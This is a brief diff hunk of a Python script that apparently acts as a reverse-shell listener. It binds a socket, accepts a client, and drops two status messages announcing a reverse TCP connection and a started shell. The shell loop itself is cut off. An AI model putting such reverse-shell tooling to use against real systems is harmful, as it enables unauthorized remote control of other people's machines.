@@ -27,12 +27,10 @@ s.bind((HOST, PORT))
 
 s.listen(1)
 while True:
-    print(Fore.BLUE+'[*]'+Fore.RESET+f' Started Reverse TCP Connection At {HOST}:{PORT}')
     client = s.accept()
     conf = ','
     hostName = socket.gethostname()
     ip = socket.gethostbyname(hostName)
-    print(Fore.YELLOW+'[*]'+Fore.RESET+f' Started Shell, Client Connected '.format(ip)+f' At ({timerun})')
     time.sleep(1)
     while True:
         try:
